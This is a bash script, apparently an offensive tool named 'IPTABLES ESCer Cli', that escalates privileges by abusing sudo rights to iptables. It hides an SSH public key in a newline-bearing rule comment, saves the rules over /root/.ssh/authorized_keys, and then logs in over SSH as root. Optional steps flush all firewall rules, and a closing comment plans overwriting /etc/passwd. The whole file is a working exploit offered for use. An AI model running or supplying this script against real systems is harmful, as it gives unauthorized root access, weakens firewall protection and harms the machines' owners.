#!/bin/bash
initColors()
{
    if [ "$nocolor" != true ]; then
        red=$(printf '\033[1;31m')
        green=$(printf '\033[1;32m')
        yellow=$(printf '\033[1;33m')
        blue=$(printf '\033[1;34m')
        reset=$(printf '\033[0m')
    fi
}
Help()
{
    echo -e "${blue}Usage:${reset} $0 [options]"
    echo ""
    echo -e "${blue}Options:${reset}"
    echo -e "  -h, --help                   Show this help message and exit"
    echo -e "  -k, --key <file>             Path to existing SSH public key to inject"
    echo -e "  -t, --target-file <file>     Path to write iptables-save output (default: /root/.ssh/authorized_keys)"
    echo -e "  -tu, --target-user <user>    Attempt SSH login as <user> after injection"
    echo -e "  -lsk, --list-keys <path>     List keys in the specified path (default /home/$USER)"
    echo -e "  -mk, --make-key              Generate a new SSH keypair (default filename: privesc_key)"
    echo -e "  -mkfn, --mk-file-name <file> Filename to use for generated SSH keypair (requires -mk)"
    echo -e "      --flush                  Flush iptables rules after injection"
    echo -e "      --no-color               Disable colored output"
    echo ""
    echo -e "${blue}Example:${reset} $0 -mk -mkfn mykey -t /root/.ssh/authorized_keys -tu root"
    echo ""
    echo -e "${blue}Note:${reset} Requires sudo rights to iptables or iptables-save, ideally with NOPASSWD."
}
Banner()
{
    echo "╔══════════════════════════════╗"
    echo "║     IPTABLES ESCer Cli       ║"
    echo "╚══════════════════════════════╝"
    echo -e "\t\tby @theRealHacker"; echo ""
}
initCheck()
{
    initSudo=$(sudo -l)
    if echo "$initSudo" | grep -Eq '(NOPASSWD: /usr/sbin/iptables|NOPASSWD: /usr/sbin/iptables-save)'; then
        echo "$yellow[*]$reset Target might be vulnerable."
    elif echo "$initSudo" | grep -q "NOPASSWD: ALL"; then
        echo "$green[+]$reset $USER has NOPASSWD: ALL privilege."
    fi
    if [[ -n "$pubkey" && -f "$pubkey" ]] && [[ "$pubkey" =~ \.pub$ ]]; then
        echo "$blue[*]$reset Public key: $pubkey"
        privkey=$(echo "$pubkey" | sed 's/\.pub$//g')
    fi
    if [ -f "$target" ]; then
        echo "$blue[*]$reset Target file: $target"
    elif [ -z "$target" ]; then
        target="/root/.ssh/authorized_keys"
        echo "$blue[*]$reset Target file: $target"
    else
        echo "$yellow[!]$reset Target file: None"
    fi
    if [ -n "$targetuser" ]; then
        echo "$blue[*]$reset Target user: $targetuser"
    else
        echo "$blue[*]$reset Target user: None"
    fi
}
lsk()
{
  local path=$1
  if [ -z "$path" ]; then
    echo "$yellow[*]$reset Searching for public keys in $HOME"
    pubkeys=$(find ~ -name *.pub 2>/dev/null)
    if [ -z "$pubkeys" ]; then
      echo -e "$red[-]$reset\tNo keys found in ~"
    else
      echo "$pubkeys" | while read -r ok; do
        echo -e "$green[+]$reset\t$ok"
      done
    fi
  elif [ -d "$path" ]; then
    echo "$yellow[*]$reset Searching for public keys in $path"
    pubkeys=$(find "$path" -name *.pub 2>/dev/null)
    if [ -z "$pubkeys" ]; then
      echo -e "$red[-]$reset\tNo keys found in $path"
    else
      echo "$pubkeys" | while read -r ok; do
        echo -e "$green[+]$reset\t$ok"
      done
    fi
  else
    echo "$red[!]$reset Must specify a directory!"
  fi
  exit 0
}
MakeKey()
{
    if [ "$isfn" = true ]; then
        ssh-keygen -t ed25519 -b 4096 -f "$fn"
        pubkey="$fn.pub"
        privkey="$fn"
    else
        ssh-keygen -t ed25519 -b 4096 -f privesc_key
        pubkey="privesc_key.pub"
        privkey="privesc_key"
    fi
}
Injection()
{
    payload=$(cat "$pubkey")
    echo "$yellow[*]$reset Injecting SSH key."
    sudo iptables -A INPUT -m comment --comment $'\n'"$payload"
    echo "$yellow[*]$reset Saving iptables to $target"
    sudo iptables-save -f "$target" || { echo "$red[!]$reset Failed to write to $target. Exiting."; exit 1; }
    echo "$green[+]$reset Done!"
    if [ "$istu" = true ]; then
        echo "$yellow[*]$reset Attempting to login as $targetuser"
        ssh -i "$privkey" "$targetuser"@127.0.0.1 2>/dev/null || { echo "$red[!]$reset Connection refused!"; exit 1; }
    fi
}
Flush()
{
    echo "$green[+]$reset Flushing table rules."
    sudo iptables -F
}
Banner
if [[ $# -eq 0 ]]; then
    initColors
    Help
    exit 1
fi
while [[ $# -gt 0 ]]; do
    case "$1" in
        -h|--help)
            initColors
            Help
            exit 0
            ;;
        -k|--key)
            pubkey="$2"
            shift 2
            ;;
        -t|--target-file)
            target="$2"
            shift 2
            ;;
        -tu|--target-user)
            istu=true
            targetuser="$2"
            shift 2
            ;;
        -lsk|--list-keys)
            initColors
            lsk "$2"
            shift 2
            ;;
        -mk|--make-key)
            makekey=true
            shift
            ;;
        -mkfn|--mk-file-name)
            if [ "$makekey" = true ]; then
                isfn=true
                fn="$2"
            fi
            shift 2
            ;;
        --flush)
            flush=true
            shift
            ;;
        --no-color)
            nocolor=true
            shift
            ;;
        *)
            initColors
            Help
            echo "[!] Unknown option: $1"
            exit 1
            ;;
    esac
done
initColors
# initCheck was here...
if [ "$makekey" = true ]; then
    MakeKey
fi
initCheck
if [ -z "$pubkey" ] || [ ! -f "$pubkey" ]; then
    echo "$red[!]$reset No valid public key provided. Exiting."
    exit 1
fi
Injection
if [ "$flush" = true ]; then
    Flush
    exit 0
fi
# Will add a new option: --payload <file>
# example: ./IptablesEsc_Cli.sh -t /etc/passwd --payload file.txt
